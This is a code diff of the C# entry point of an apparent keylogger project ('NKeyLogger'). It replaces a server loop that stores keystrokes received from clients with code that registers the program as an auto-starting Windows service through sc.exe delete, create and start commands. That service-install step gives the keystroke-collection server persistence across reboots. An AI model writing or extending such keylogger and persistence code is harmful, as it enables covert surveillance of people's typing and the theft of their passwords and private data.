@@ -1,47 +1,64 @@
-﻿using System.Linq.Expressions;
+﻿using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Linq.Expressions;
 using System.Runtime.CompilerServices;
 using System.Security.Cryptography;
+using Microsoft.Extensions.DependencyInjection;
+using Microsoft.Extensions.Hosting;
 using Microsoft.Extensions.Logging;
 using NKeyLoggerLib;
 using NKeyLoggerServer;
 class Program
 {
-    static string settingPath = "setting.txt";
-    static int waitForReconnect = 500;
-    public static void Main(string[] args)
+    public static async Task Main(string[] args)
     {
-        try
+        string serviceName = System.AppDomain.CurrentDomain.FriendlyName;
+
+        if (args.Length == 0)
         {
-            AbstractSetting setting = new ConstSetting(settingPath, true);
-            Server server = new Server(setting);
-            StorageManager manager = new StorageManager(setting);
+            string binPathStr = Directory.GetCurrentDirectory() + $"\\{serviceName}.exe {Directory.GetCurrentDirectory()}";
+            Cmd cmd = new Cmd();
 
-            server.disconnectClient += manager.removeClient;
-            server.keyHandler += manager.saveToFile;
-
-            var startTask = server.start();
-
-            server.updateTask += (Task t) =>
+            Result<bool>? writeResult = null;
+            writeResult = cmd.Write($"sc.exe delete {serviceName}");
+            if (writeResult.isFailure)
             {
-                if (!t.IsCanceled)
-                    startTask = t;
-            };
-        again:
-            try
-            {
-                if (!startTask.IsCanceled)
-                    startTask.Wait();
+                Log<Program>.Instance.logger?.LogError(writeResult.Error);
+                return;
             }
-            catch (AggregateException)
+
+            writeResult = cmd.Write($"sc.exe create {serviceName} binPath= \"{binPathStr}\" start= auto");
+            if (writeResult.isFailure)
             {
-                Thread.Sleep(waitForReconnect);
-                if (!startTask.IsCanceled)
-                    goto again;
+                Log<Program>.Instance.logger?.LogError(writeResult.Error);
+                return;
             }
+
+            writeResult = cmd.Write($"sc.exe start {serviceName}");
+            if (writeResult.isFailure)
+            {
+                Log<Program>.Instance.logger?.LogError(writeResult.Error);
+                return;
+            }
+            Thread.Sleep(2000);
+            Console.WriteLine(cmd.Readed);
+            Thread.Sleep(5000);
         }
-        catch (Exception ex)
+        else
         {
-            Log<Program>.Instance.logger?.LogError(ex.ToString());
+            if (args.Length != 0)
+                Directory.SetCurrentDirectory(args[0]);
+            IHost host = Host.CreateDefaultBuilder(args)
+            .UseWindowsService(options =>
+            {
+                options.ServiceName = "NKeyLoggerService";
+            })
+            .ConfigureServices(services =>
+            {
+                services.AddHostedService<ServiceWorker>();
+            }).Build();
+            await host.RunAsync();
         }
     }
 }
